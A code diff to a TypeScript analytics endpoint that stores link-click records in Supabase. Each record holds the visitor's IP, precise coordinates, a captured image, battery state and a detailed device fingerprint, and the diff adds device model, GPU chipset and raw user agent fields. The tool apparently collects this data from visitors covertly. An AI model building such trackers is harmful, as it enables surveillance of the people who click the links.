@@ -184,34 +184,59 @@ export async function POST(req: Request) {
       }
     }
 
-    // Insert analytics record
-    const { data, error } = await supabase
+    // Prepare full analytics row with new device intelligence
+    const fullRow: Record<string, any> = {
+      url_id: urlId,
+      ip_address: ipAddress || 'Unknown',
+      location_name: locationName || 'Unknown',
+      device_type: deviceType || 'Desktop',
+      browser: browser || 'Unknown',
+      os: os || 'Unknown',
+      referrer: referrer || 'Direct',
+      captured_image: capturedImage || null,
+      latitude: latitude || null,
+      longitude: longitude || null,
+      battery_level: batteryLevel ?? null,
+      is_charging: isCharging ?? null,
+      network_type: networkType || 'Unknown',
+      screen_resolution: screenResolution || 'Unknown',
+      language: language || 'en',
+      hardware_concurrency: hardwareConcurrency || null,
+      device_memory: deviceMemory || null,
+      color_depth: colorDepth || null,
+      timezone: timezone || 'Unknown',
+      webgl_vendor: webglVendor || 'Unknown',
+      webgl_renderer: webglRenderer || 'Unknown',
+      device_model: body.deviceModel || null,
+      os_version: body.osVersion || os || null,
+      touch_points: typeof body.touchPoints === 'number' ? body.touchPoints : null,
+      raw_user_agent: body.userAgent || null,
+      gpu_chipset: body.gpuChipset || null,
+    };
+
+    let { data, error } = await supabase
       .from('link_analytics')
-      .insert({
-        url_id: urlId,
-        ip_address: ipAddress || 'Unknown',
-        location_name: locationName || 'Unknown',
-        device_type: deviceType || 'Desktop',
-        browser: browser || 'Unknown',
-        os: os || 'Unknown',
-        referrer: referrer || 'Direct',
-        captured_image: capturedImage || null,
-        latitude: latitude || null,
-        longitude: longitude || null,
-        battery_level: batteryLevel ?? null,
-        is_charging: isCharging ?? null,
-        network_type: networkType || 'Unknown',
-        screen_resolution: screenResolution || 'Unknown',
-        language: language || 'en',
-        hardware_concurrency: hardwareConcurrency || null,
-        device_memory: deviceMemory || null,
-        color_depth: colorDepth || null,
-        timezone: timezone || 'Unknown',
-        webgl_vendor: webglVendor || 'Unknown',
-        webgl_renderer: webglRenderer || 'Unknown',
-      })
+      .insert(fullRow)
       .select()
       .single();
+
+    // Fallback if user hasn't run the migration yet for the new columns
+    if (error && (error.message?.includes('column') || error.code === 'PGRST204' || error.code === '42703')) {
+      const basicRow = { ...fullRow };
+      delete basicRow.device_model;
+      delete basicRow.os_version;
+      delete basicRow.touch_points;
+      delete basicRow.raw_user_agent;
+      delete basicRow.gpu_chipset;
+
+      const fallbackRes = await supabase
+        .from('link_analytics')
+        .insert(basicRow)
+        .select()
+        .single();
+      data = fallbackRes.data;
+      error = fallbackRes.error;
+    }
 
     if (error) {
       console.error('Analytics insert error:', error);
